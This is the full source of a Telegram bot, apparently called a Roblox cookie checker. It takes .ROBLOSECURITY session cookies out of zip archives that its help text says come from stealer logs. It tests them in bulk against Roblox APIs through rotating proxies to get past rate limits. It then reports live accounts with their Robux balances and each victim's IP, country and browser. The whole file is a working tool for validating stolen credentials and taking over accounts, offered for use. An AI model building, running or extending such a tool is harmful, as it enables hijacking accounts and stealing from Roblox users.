import asyncio
import aiohttp
import aiohttp_socks
import telebot
from telebot import types
import time
import threading
import re
import os
import zipfile
import io
import random
import requests
from config import BOT_TOKEN, OWNER_ID

bot = telebot.TeleBot(BOT_TOKEN)

# ─── Proxy Input Session ────────────────────────────────────────────
# Tracks per-user proxy input mode so users can paste, upload files,
# or send URLs one-by-one and then press "Done" to load them all.

class ProxyInputSession:
    """Holds accumulated proxy lines while a user is in proxy-input mode."""

    def __init__(self, chat_id, msg_id):
        self.chat_id = chat_id
        self.msg_id = msg_id          # the status message we keep editing
        self.lines: list[str] = []    # accumulated raw proxy lines
        self.sources: list[str] = []  # description of each source

    def add_lines(self, raw_text: str, source_desc: str):
        added = 0
        for line in raw_text.splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                self.lines.append(line)
                added += 1
        if added:
            self.sources.append(f"{source_desc} ({added} lines)")
        return added

    @property
    def total(self):
        return len(self.lines)

    def status_text(self):
        src_list = "\n".join(f"  • {s}" for s in self.sources) if self.sources else "  None yet"
        return (
            f"🌐 *Proxy Input Mode*\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Collected: *{self.total}* proxy lines\n"
            f"📥 Sources:\n"
            f"{src_list}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"Send more proxies, files, or URLs.\n"
            f"Press *Done ✅* to load them all."
        )

# chat_id -> ProxyInputSession
proxy_sessions: dict[int, ProxyInputSession] = {}

# ─── Proxy Rotator ────────────────────────────────────────────────────
class ProxyRotator:
    """Thread-safe proxy rotator supporting all proxy formats."""
    
    def __init__(self):
        self.proxies = []        # list of proxy dicts for aiohttp
        self.proxy_raw = []      # list of raw proxy strings
        self.index = 0
        self._lock = threading.Lock()
        self.dead_proxies = set()
        self.enabled = False

    def load_from_text(self, text):
        """Parse proxy list from text. Supports all formats:
        
        Formats supported:
        - ip:port
        - ip:port:user:pass
        - user:pass@ip:port
        - http://ip:port
        - http://user:pass@ip:port
        - https://ip:port
        - https://user:pass@ip:port
        - socks4://ip:port
        - socks4://user:pass@ip:port
        - socks5://ip:port
        - socks5://user:pass@ip:port
        """
        self.proxies = []
        self.proxy_raw = []
        self.dead_proxies = set()
        self.index = 0

        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            proxy = self._parse_proxy(line)
            if proxy:
                self.proxies.append(proxy)
                self.proxy_raw.append(line)

        if self.proxies:
            self.enabled = True

    def _parse_proxy(self, line):
        """Parse a single proxy line into aiohttp-compatible format."""
        try:
            # Already has scheme
            if "://" in line:
                return self._parse_with_scheme(line)
            
            # ip:port:user:pass format
            parts = line.split(":")
            if len(parts) == 4:
                ip, port, user, pwd = parts
                return {
                    "scheme": "http",
                    "host": ip,
                    "port": int(port),
                    "username": user,
                    "password": pwd,
                    "url": f"http://{user}:{pwd}@{ip}:{port}",
                    "raw": line,
                }
            
            # ip:port format
            if len(parts) == 2:
                ip, port = parts
                return {
                    "scheme": "http",
                    "host": ip,
                    "port": int(port),
                    "username": None,
                    "password": None,
                    "url": f"http://{ip}:{port}",
                    "raw": line,
                }
            
            # user:pass@ip:port format
            if "@" in line:
                auth_part, host_part = line.rsplit("@", 1)
                user, pwd = auth_part.split(":", 1)
                ip, port = host_part.split(":")
                return {
                    "scheme": "http",
                    "host": ip,
                    "port": int(port),
                    "username": user,
                    "password": pwd,
                    "url": f"http://{user}:{pwd}@{ip}:{port}",
                    "raw": line,
                }
        except Exception:
            pass
        return None

    def _parse_with_scheme(self, line):
        """Parse proxy with scheme (http://, https://, socks4://, socks5://)."""
        scheme, rest = line.split("://", 1)
        scheme = scheme.lower()
        
        if scheme not in ("http", "https", "socks4", "socks5"):
            return None

        # Has auth: user:pass@host:port
        if "@" in rest:
            auth_part, host_part = rest.rsplit("@", 1)
            user, pwd = auth_part.split(":", 1)
            ip, port = host_part.split(":")
            return {
                "scheme": scheme,
                "host": ip,
                "port": int(port),
                "username": user,
                "password": pwd,
                "url": f"{scheme}://{user}:{pwd}@{ip}:{port}",
                "raw": line,
            }
        else:
            # No auth: host:port
            ip, port = rest.split(":")
            return {
                "scheme": scheme,
                "host": ip,
                "port": int(port),
                "username": None,
                "password": None,
                "url": f"{scheme}://{ip}:{port}",
                "raw": line,
            }

    def get_next(self):
        """Get next proxy with rotation. Returns proxy dict or None."""
        if not self.enabled or not self.proxies:
            return None
        
        with self._lock:
            if not self.proxies:
                return None
            
            # Try to find a non-dead proxy
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.index % len(self.proxies)]
                self.index += 1
                if proxy["raw"] not in self.dead_proxies:
                    return proxy
                attempts += 1
            
            # All proxies dead, reset and return random
            self.dead_proxies.clear()
            return random.choice(self.proxies) if self.proxies else None

    def mark_dead(self, proxy):
        """Mark a proxy as dead/banned."""
        if proxy:
            with self._lock:
                self.dead_proxies.add(proxy["raw"])
                # If more than 80% proxies are dead, reset
                if len(self.dead_proxies) > len(self.proxies) * 0.8:
                    self.dead_proxies.clear()

    def count(self):
        """Return total and alive proxy count."""
        with self._lock:
            total = len(self.proxies)
            dead = len(self.dead_proxies)
            return total, total - dead

proxy_rotator = ProxyRotator()

# ─── Stats ────────────────────────────────────────────────────────────
class CheckerStats:
    def __init__(self):
        self.reset()

    def reset(self):
        self.total = 0
        self.hits = 0
        self.dead = 0
        self.no_cookie = 0
        self.checked = 0
        self.start_time = None
        self.hits_list = []
        self.high_robux = []
        self.all_robux = 0
        self._lock = threading.Lock()

    def add_hit(self, username, user_id, robux, ip, country, browser):
        with self._lock:
            self.hits += 1
            self.checked += 1
            self.all_robux += robux
            self.hits_list.append((username, user_id, robux, ip, country, browser))
            if robux >= 1000:
                self.high_robux.append((username, user_id, robux, ip, country, browser))

    def add_dead(self):
        with self._lock:
            self.dead += 1
            self.checked += 1

    def add_no_cookie(self):
        with self._lock:
            self.no_cookie += 1
            self.checked += 1

    def elapsed(self):
        if not self.start_time:
            return 0
        return time.time() - self.start_time

stats = CheckerStats()

# ─── Owner-only decorator ─────────────────────────────────────────────
def owner_only(func):
    def wrapper(message):
        if message.from_user.id != OWNER_ID:
            bot.reply_to(message, "⛔ Access denied. Owner only.")
            return
        return func(message)
    return wrapper

# ─── Format elapsed time ──────────────────────────────────────────────
def format_elapsed(seconds):
    h = int(seconds // 3600)
    m = int((seconds % 3600) // 60)
    s = int(seconds % 60)
    return f"{h:02d}:{m:02d}:{s:02d}"

# ─── Parse filename for metadata ──────────────────────────────────────
def parse_filename(filename):
    """Extract country, IP, browser from cookie filename."""
    base = os.path.splitext(filename)[0]
    parts = base.split("__Cookies__")
    info_part = parts[0] if len(parts) >= 1 else base
    browser_part = parts[1] if len(parts) >= 2 else "Unknown"

    browser = browser_part.replace("_", " ").strip() or "Unknown"

    country = "??"
    ip = "?.?.?.?"

    country_match = re.search(r'_([A-Z]{2})_', info_part)
    if country_match:
        country = country_match.group(1)

    ip_match = re.search(r'_+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:_|$)', info_part)
    if ip_match:
        ip = ip_match.group(1)

    return country, ip, browser

# ─── Fast cookie extraction ───────────────────────────────────────────
def extract_roblosecurity(content):
    """Fast extraction of .ROBLOSECURITY from Netscape cookie file content."""
    for line in content.splitlines():
        if line.startswith("#") or not line:
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5].strip() == ".ROBLOSECURITY":
            return parts[6].strip()
    return None

def fast_extract_roblosecurity(content):
    """Ultra-fast extraction using string search before full parsing."""
    # Quick check: if .ROBLOSECURITY isn't in the content, skip immediately
    if ".ROBLOSECURITY" not in content:
        return None
    return extract_roblosecurity(content)

def process_upload(file_content, filename):
    """Process an uploaded file and return list of (roblosecurity, country, ip, browser, filename).
    
    Supports:
    - .zip containing cookie .txt files (fast parallel extraction)
    - .txt with one cookie per line (plain format)
    - .txt in Netscape cookie format
    """
    cookie_entries = []
    
    if filename.endswith('.zip'):
        try:
            with zipfile.ZipFile(io.BytesIO(file_content), 'r') as zf:
                # Filter valid txt files first
                txt_files = [n for n in zf.namelist() 
                            if n.endswith('.txt') and not n.startswith('__MACOSX')]
                
                # Read all files at once for speed
                for name in txt_files:
                    try:
                        content = zf.read(name).decode('utf-8', errors='ignore')
                        basename = os.path.basename(name)
                        country, ip, browser = parse_filename(basename)
                        roblosecurity = fast_extract_roblosecurity(content)
                        if roblosecurity:
                            cookie_entries.append((roblosecurity, country, ip, browser, basename))
                        else:
                            # Track no-cookie files in stats later
                            pass
                    except Exception:
                        continue
        except zipfile.BadZipFile:
            pass
    else:
        content = file_content.decode('utf-8', errors='ignore')
        roblosecurity = fast_extract_roblosecurity(content)
        if roblosecurity:
            country, ip, browser = parse_filename(filename)
            cookie_entries.append((roblosecurity, country, ip, browser, filename))
        else:
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    cookie_entries.append((line, "??", "?.?.?.?", "Direct", "manual"))
    
    return cookie_entries

# ─── Progress message builder ─────────────────────────────────────────
def build_progress_text():
    elapsed = stats.elapsed()
    hits_text = ""
    if stats.hits_list:
        for username, user_id, robux, ip, country, browser in stats.hits_list:
            hits_text += f"  💎 `{username}` ({robux} R$) 🌍{country} 🖥{browser}\n"
    else:
        hits_text = "  None yet\n"

    proxy_info = ""
    if proxy_rotator.enabled:
        total_p, alive_p = proxy_rotator.count()
        proxy_info = f"🌐 Proxy: {alive_p}/{total_p}\n"

    return (
        f"⚡️ CHECKING ⚡️\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"📊 Progress:\n"
        f"🔑 Total: {stats.total}\n"
        f"💎 Hits: {stats.hits}\n"
        f"❌ Dead: {stats.dead}\n"
        f"🚫 No Cookie: {stats.no_cookie}\n"
        f"📝 Checked: {stats.checked}/{stats.total}\n"
        f"{proxy_info}"
        f"━━━━━━━━━━━━━━━━━\n"
        f"⏱️ Time: {format_elapsed(elapsed)}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💎 Hits:\n"
        f"{hits_text}"
        f"🔥 all robux: {stats.all_robux}\n"
        f"💎 high robux value user: {len(stats.high_robux)}"
    )

# ─── Async Cookie Validator with Proxy ────────────────────────────────
ROBLOX_AUTH_URL = "https://www.roblox.com/mobileapi/userinfo"
ROBLOX_CURRENCY_URL = "https://economy.roblox.com/v1/users/{}/currency"

CONCURRENCY = 50  # higher concurrency for speed

def get_proxy_connector():
    """Create an aiohttp connector with proxy if available."""
    proxy = proxy_rotator.get_next()
    if not proxy:
        return None, None
    
    if proxy["scheme"] in ("socks4", "socks5"):
        # Use aiohttp_socks for SOCKS proxies
        if proxy["username"]:
            proxy_url = f"{proxy['scheme']}://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"
        else:
            proxy_url = f"{proxy['scheme']}://{proxy['host']}:{proxy['port']}"
        connector = aiohttp_socks.ProxyConnector.from_url(proxy_url)
        return connector, proxy
    else:
        # HTTP/HTTPS proxies use proxy parameter on request
        return None, proxy

async def validate_cookie(session, roblosecurity, use_proxy=True):
    """Validate a .ROBLOSECURITY cookie with proxy rotation."""
    proxy = None
    proxy_url = None
    
    if use_proxy and proxy_rotator.enabled:
        proxy = proxy_rotator.get_next()
        if proxy:
            proxy_url = proxy["url"]

    try:
        headers = {"Cookie": f".ROBLOSECURITY={roblosecurity}"}
        kwargs = {"headers": headers, "timeout": aiohttp.ClientTimeout(total=10)}
        if proxy_url and proxy and proxy["scheme"] in ("http", "https"):
            kwargs["proxy"] = proxy_url

        async with session.get(ROBLOX_AUTH_URL, **kwargs) as resp:
            if resp.status != 200:
                if resp.status in (403, 429) and proxy:
                    proxy_rotator.mark_dead(proxy)
                return (False, None, None, 0)
            data = await resp.json(content_type=None)
            if "UserID" not in data:
                return (False, None, None, 0)
            user_id = data["UserID"]
            username = data.get("UserName", data.get("Username", f"User{user_id}"))
            robux = 0
            try:
                curr_kwargs = {"headers": headers, "timeout": aiohttp.ClientTimeout(total=8)}
                if proxy_url and proxy and proxy["scheme"] in ("http", "https"):
                    curr_kwargs["proxy"] = proxy_url
                async with session.get(
                    ROBLOX_CURRENCY_URL.format(user_id), **curr_kwargs
                ) as currency_resp:
                    if currency_resp.status == 200:
                        cdata = await currency_resp.json(content_type=None)
                        robux = cdata.get("robux", 0)
            except Exception:
                pass
            return (True, username, user_id, robux)
    except (aiohttp.ClientProxyConnectionError, aiohttp_socks.ProxyConnectionError, 
            aiohttp.ClientHttpProxyError, ConnectionError):
        if proxy:
            proxy_rotator.mark_dead(proxy)
        return (False, None, None, 0)
    except Exception:
        return (False, None, None, 0)

async def run_checker(chat_id, progress_msg, cookie_entries):
    """Run the checker with concurrency, proxy rotation, and live progress updates."""
    stats.reset()
    stats.total = len(cookie_entries)
    stats.start_time = time.time()

    # Create connector based on proxy type
    connector_kwargs = {"limit": CONCURRENCY, "limit_per_host": 0}  # no per-host limit with proxies
    
    # If using SOCKS proxies, we need a different approach
    if proxy_rotator.enabled and any(p["scheme"] in ("socks4", "socks5") for p in proxy_rotator.proxies):
        # For SOCKS: create individual sessions per request with connector
        connector = aiohttp.TCPConnector(**connector_kwargs)
    else:
        connector = aiohttp.TCPConnector(**connector_kwargs)

    async with aiohttp.ClientSession(connector=connector) as session:
        sem = asyncio.Semaphore(CONCURRENCY)

        async def check_one(entry):
            roblosecurity, country, ip, browser, filename = entry
            async with sem:
                # For SOCKS proxies, we need to create per-request sessions
                if proxy_rotator.enabled and any(p["scheme"] in ("socks4", "socks5") for p in proxy_rotator.proxies):
                    proxy = proxy_rotator.get_next()
                    if proxy and proxy["scheme"] in ("socks4", "socks5"):
                        if proxy["username"]:
                            proxy_url = f"{proxy['scheme']}://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"
                        else:
                            proxy_url = f"{proxy['scheme']}://{proxy['host']}:{proxy['port']}"
                        try:
                            sock_connector = aiohttp_socks.ProxyConnector.from_url(proxy_url)
                            async with aiohttp.ClientSession(connector=sock_connector) as sock_session:
                                result = await _validate_with_session(sock_session, roblosecurity, proxy)
                        except Exception:
                            if proxy:
                                proxy_rotator.mark_dead(proxy)
                            result = (False, None, None, 0)
                    else:
                        result = await validate_cookie(session, roblosecurity)
                else:
                    result = await validate_cookie(session, roblosecurity)
                
                if result[0]:
                    stats.add_hit(result[1], result[2], result[3], ip, country, browser)
                else:
                    stats.add_dead()
                return result

        tasks = [check_one(e) for e in cookie_entries]

        async def progress_updater():
            while stats.checked < stats.total:
                await asyncio.sleep(2)
                try:
                    bot.edit_message_text(
                        build_progress_text(),
                        chat_id,
                        progress_msg.message_id,
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass

        updater_task = asyncio.create_task(progress_updater())
        await asyncio.gather(*tasks)
        updater_task.cancel()

    try:
        bot.edit_message_text(
            build_progress_text(),
            chat_id,
            progress_msg.message_id,
            parse_mode="Markdown"
        )
    except Exception:
        pass

    if stats.hits_list:
        hits_detail = "💎 *HITS DETAILS:*\n━━━━━━━━━━━━━━━━━\n"
        for username, user_id, robux, ip, country, browser in stats.hits_list:
            hits_detail += f"👤 `{username}` | ID: `{user_id}` | 💰 {robux} R$\n"
            hits_detail += f"🌍 {country} | 🖥 {browser} | 🌐 {ip}\n"
            hits_detail += f"🔗 https://www.roblox.com/users/{user_id}/profile\n\n"
        hits_detail += f"\n🔥 Total Robux: {stats.all_robux}\n💎 High Robux Users (≥1000 R$): {len(stats.high_robux)}"
        try:
            bot.send_message(chat_id, hits_detail, parse_mode="Markdown")
        except Exception:
            chunks = [hits_detail[i:i+4000] for i in range(0, len(hits_detail), 4000)]
            for chunk in chunks:
                bot.send_message(chat_id, chunk)

    proxy_status = ""
    if proxy_rotator.enabled:
        total_p, alive_p = proxy_rotator.count()
        proxy_status = f"🌐 Proxy Alive: {alive_p}/{total_p}\n"

    bot.send_message(
        chat_id,
        f"✅ *Checking Complete!*\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"📝 Total: {stats.total}\n"
        f"💎 Hits: {stats.hits}\n"
        f"❌ Dead: {stats.dead}\n"
        f"🚫 No Cookie: {stats.no_cookie}\n"
        f"🔥 All Robux: {stats.all_robux}\n"
        f"{proxy_status}"
        f"⏱️ Time: {format_elapsed(stats.elapsed())}",
        parse_mode="Markdown"
    )

async def _validate_with_session(session, roblosecurity, proxy=None):
    """Validate cookie using a specific session (for SOCKS proxies)."""
    try:
        headers = {"Cookie": f".ROBLOSECURITY={roblosecurity}"}
        async with session.get(ROBLOX_AUTH_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                if resp.status in (403, 429) and proxy:
                    proxy_rotator.mark_dead(proxy)
                return (False, None, None, 0)
            data = await resp.json(content_type=None)
            if "UserID" not in data:
                return (False, None, None, 0)
            user_id = data["UserID"]
            username = data.get("UserName", data.get("Username", f"User{user_id}"))
            robux = 0
            try:
                async with session.get(
                    ROBLOX_CURRENCY_URL.format(user_id),
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=8)
                ) as currency_resp:
                    if currency_resp.status == 200:
                        cdata = await currency_resp.json(content_type=None)
                        robux = cdata.get("robux", 0)
            except Exception:
                pass
            return (True, username, user_id, robux)
    except (aiohttp.ClientProxyConnectionError, aiohttp_socks.ProxyConnectionError,
            aiohttp.ClientHttpProxyError, ConnectionError):
        if proxy:
            proxy_rotator.mark_dead(proxy)
        return (False, None, None, 0)
    except Exception:
        return (False, None, None, 0)

# ─── Bot Commands ──────────────────────────────────────────────────────

@bot.message_handler(commands=["start"])
@owner_only
def handle_start(message):
    bot.reply_to(
        message,
        "⚡️ *Welcome to Roblox Cookie Checker Bot!* ⚡️\n\n"
        "Type /menu to see all commands.",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["menu"])
@owner_only
def handle_menu(message):
    proxy_status = "✅ Loaded" if proxy_rotator.enabled else "❌ No proxy"
    if proxy_rotator.enabled:
        total_p, alive_p = proxy_rotator.count()
        proxy_status = f"✅ {alive_p}/{total_p} alive"

    bot.reply_to(
        message,
        f"⚡️ *ROBLOX COOKIE CHECKER* ⚡️\n"
        f"━━━━━━━━━━━━━━━━━\n\n"
        f"🔥 /check - Check cookies from .zip or .txt\n"
        f"🌐 /proxy - Load proxies (interactive: paste, file, or URL)\n"
        f"📊 /stats - View current checker stats\n"
        f"🗑️ /proxyclear - Clear all proxies\n"
        f"❓ /help - How to use the bot\n"
        f"📋 /menu - Show this menu\n\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"🌐 Proxy: {proxy_status}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"🤖 Powered by Yuki",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["help"])
@owner_only
def handle_help(message):
    bot.reply_to(
        message,
        "⚡️ *Cookie Checker Help* ⚡️\n\n"
        "🔥 *Checking Cookies:*\n"
        "1️⃣ Send /check with a .zip or .txt file\n"
        "2️⃣ .zip = cookie files from stealer logs\n"
        "3️⃣ .txt = plain cookies (one per line) or Netscape format\n"
        "4️⃣ Live progress shown during checking\n\n"
        "🌐 *Proxy Setup (Interactive):*\n"
        "1️⃣ /proxy → enters proxy input mode\n"
        "2️⃣ Paste proxy lines directly in chat\n"
        "3️⃣ Upload .txt files with proxies\n"
        "4️⃣ Send GitHub raw / pastebin URLs\n"
        "5️⃣ Mix all methods, send multiple times\n"
        "6️⃣ Press Done ✅ to load, Cancel ❌ to abort\n\n"
        "📋 *Supported proxy formats:*\n"
        "• ip:port\n"
        "• ip:port:user:pass\n"
        "• user:pass@ip:port\n"
        "• http://, https://, socks4://, socks5://\n\n"
        "💡 Auto-rotates proxies and removes dead ones!",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["proxy"])
@owner_only
def handle_proxy(message):
    """Enter interactive proxy-input mode.

    The user can then:
    • Paste proxy lines directly as text messages
    • Upload .txt files containing proxies
    • Send GitHub / raw.githubusercontent.com URLs
    • Mix any of the above, multiple times

    When finished, press the Done ✅ button to load everything.
    Press Cancel ❌ to abort without loading.
    """
    chat_id = message.chat.id

    # If already in a proxy session, just update the status
    if chat_id in proxy_sessions:
        sess = proxy_sessions[chat_id]
        try:
            bot.edit_message_text(
                sess.status_text(),
                chat_id,
                sess.msg_id,
                parse_mode="Markdown",
                reply_markup=_proxy_mode_keyboard()
            )
        except Exception:
            pass
        bot.reply_to(message, "⚠️ You're already in proxy input mode. Keep sending proxies or press Done ✅.")
        return

    # Create a new session
    markup = _proxy_mode_keyboard()
    status_msg = bot.reply_to(
        message,
        "🌐 *Proxy Input Mode*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📊 Collected: *0* proxy lines\n"
        "📥 Sources:\n"
        "  None yet\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send proxies by:\n"
        "• Pasting proxy lines directly\n"
        "• Uploading a .txt file\n"
        "• Sending a GitHub raw URL\n\n"
        "Press *Done ✅* when finished.",
        parse_mode="Markdown",
        reply_markup=markup
    )

    proxy_sessions[chat_id] = ProxyInputSession(chat_id, status_msg.message_id)


def _proxy_mode_keyboard():
    """Inline keyboard for proxy input mode."""
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ Done", callback_data="proxy_done"),
        types.InlineKeyboardButton("❌ Cancel", callback_data="proxy_cancel"),
    )
    return markup


def _update_session_status(sess):
    """Edit the status message to reflect the current session state."""
    try:
        bot.edit_message_text(
            sess.status_text(),
            sess.chat_id,
            sess.msg_id,
            parse_mode="Markdown",
            reply_markup=_proxy_mode_keyboard()
        )
    except Exception:
        pass


def _is_github_raw_url(text):
    """Check if text looks like a GitHub raw / paste URL."""
    lower = text.lower().strip()
    return any(domain in lower for domain in [
        "github.com", "raw.githubusercontent.com", "pastebin.com",
        "paste.ee", "rentry.co", "hastebin.com"
    ])


def _fetch_url_text(url):
    """Download text content from a URL. Returns None on failure."""
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            return resp.text
    except Exception:
        pass
    return None


def _process_proxy_input(message):
    """Handle a regular text / document message while in proxy-input mode."""
    chat_id = message.chat.id
    if chat_id not in proxy_sessions:
        return False  # not in proxy mode

    sess = proxy_sessions[chat_id]

    # ── 1) Document (.txt file) attached ────────────────────────────
    if message.document:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode("utf-8", errors="ignore")
        fname = message.document.file_name or "file.txt"
        added = sess.add_lines(content, f"📄 {fname}")
        if added:
            bot.reply_to(message, f"✅ Added *{added}* proxies from `{fname}`", parse_mode="Markdown")
        else:
            bot.reply_to(message, "⚠️ No valid proxy lines found in that file.")
        _update_session_status(sess)
        return True

    # ── 2) Text message ─────────────────────────────────────────────
    text = message.text
    if not text:
        return True

    text = text.strip()

    # Check if it's a URL (GitHub raw, pastebin, etc.)
    if _is_github_raw_url(text):
        # Extract URL — might be the whole message or embedded
        url_match = re.search(r'(https?://[^\s]+)', text)
        if url_match:
            url = url_match.group(1)
            bot.reply_to(message, "📥 Downloading proxy list...")
            content = _fetch_url_text(url)
            if content:
                added = sess.add_lines(content, "🔗 URL")
                if added:
                    bot.reply_to(message, f"✅ Added *{added}* proxies from URL", parse_mode="Markdown")
                else:
                    bot.reply_to(message, "⚠️ Downloaded but no valid proxy lines found.")
            else:
                bot.reply_to(message, "❌ Failed to download from that URL.")
            _update_session_status(sess)
            return True

    # Plain pasted proxy lines
    added = sess.add_lines(text, "✏️ Pasted")
    if added:
        bot.reply_to(message, f"✅ Added *{added}* proxy lines", parse_mode="Markdown")
    else:
        bot.reply_to(message, "⚠️ No valid proxy lines detected in that message.")
    _update_session_status(sess)
    return True


# ── Catch-all handler for messages while in proxy mode ───────────────
# We register this with higher priority so it fires BEFORE other message
# handlers when the user is in proxy-input mode.

@bot.message_handler(func=lambda m: m.chat.id in proxy_sessions, content_types=["text", "document"])
def proxy_mode_catchall(message):
    """Intercept text/document messages while the user is in proxy-input mode."""
    _process_proxy_input(message)


# ── Callback handlers for Done / Cancel buttons ─────────────────────

@bot.callback_query_handler(func=lambda call: call.data == "proxy_done")
def callback_proxy_done(call):
    chat_id = call.message.chat.id
    if chat_id not in proxy_sessions:
        bot.answer_callback_query(call.id, "⚠️ No active proxy session.", show_alert=True)
        return

    sess = proxy_sessions.pop(chat_id)
    all_text = "\n".join(sess.lines)

    if not all_text.strip():
        bot.edit_message_text(
            "❌ No proxies were collected. Session cancelled.",
            chat_id,
            sess.msg_id
        )
        bot.answer_callback_query(call.id, "No proxies collected.")
        return

    # Load everything into the proxy rotator
    proxy_rotator.load_from_text(all_text)
    total_p, alive_p = proxy_rotator.count()

    if total_p == 0:
        bot.edit_message_text(
            "❌ No valid proxies found in the collected data.",
            chat_id,
            sess.msg_id
        )
        bot.answer_callback_query(call.id, "No valid proxies.")
        return

    src_list = "\n".join(f"  • {s}" for s in sess.sources)
    bot.edit_message_text(
        f"✅ *Proxies Loaded!*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📝 Total: {total_p}\n"
        f"✅ Valid: {alive_p}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📥 Sources:\n"
        f"{src_list}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 Proxy rotation enabled!",
        chat_id,
        sess.msg_id,
        parse_mode="Markdown"
    )
    bot.answer_callback_query(call.id, f"✅ {alive_p}/{total_p} proxies loaded!")


@bot.callback_query_handler(func=lambda call: call.data == "proxy_cancel")
def callback_proxy_cancel(call):
    chat_id = call.message.chat.id
    if chat_id not in proxy_sessions:
        bot.answer_callback_query(call.id, "⚠️ No active proxy session.", show_alert=True)
        return

    proxy_sessions.pop(chat_id)
    bot.edit_message_text(
        "❌ Proxy input cancelled. No proxies were loaded.",
        chat_id,
        call.message.message_id
    )
    bot.answer_callback_query(call.id, "Cancelled.")

@bot.message_handler(commands=["proxyclear"])
@owner_only
def handle_proxy_clear(message):
    proxy_rotator.proxies = []
    proxy_rotator.proxy_raw = []
    proxy_rotator.dead_proxies = set()
    proxy_rotator.enabled = False
    proxy_rotator.index = 0
    bot.reply_to(message, "🗑️ All proxies cleared. Checking will run without proxy.", parse_mode="Markdown")

@bot.message_handler(commands=["check"])
@owner_only
def handle_check(message):
    if not message.document:
        bot.reply_to(message, "❌ Please attach a .zip or .txt file with cookies.\nUsage: /check with file attached", parse_mode="Markdown")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    filename = message.document.file_name or "unknown.txt"

    cookie_entries = process_upload(downloaded, filename)

    if not cookie_entries:
        bot.reply_to(message, "❌ No .ROBLOSECURITY cookies found in the file.")
        return

    stats.reset()
    stats.total = len(cookie_entries)
    stats.start_time = time.time()

    proxy_info = ""
    if proxy_rotator.enabled:
        total_p, alive_p = proxy_rotator.count()
        proxy_info = f"\n🌐 Proxy: {alive_p}/{total_p}"

    bot.send_message(
        message.chat.id,
        f"📂 *File:* `{filename}`\n"
        f"🔑 *Cookies found:* {len(cookie_entries)}{proxy_info}\n"
        f"🚀 Starting check...",
        parse_mode="Markdown"
    )
    progress_msg = bot.reply_to(message, build_progress_text(), parse_mode="Markdown")

    def run_in_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(run_checker(message.chat.id, progress_msg, cookie_entries))
        finally:
            loop.close()

    thread = threading.Thread(target=run_in_thread, daemon=True)
    thread.start()

@bot.message_handler(commands=["stats"])
@owner_only
def handle_stats(message):
    bot.reply_to(message, build_progress_text(), parse_mode="Markdown")

# ─── Start ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("⚡️ Cookie Checker Bot is running...")
    bot.infinity_polling()
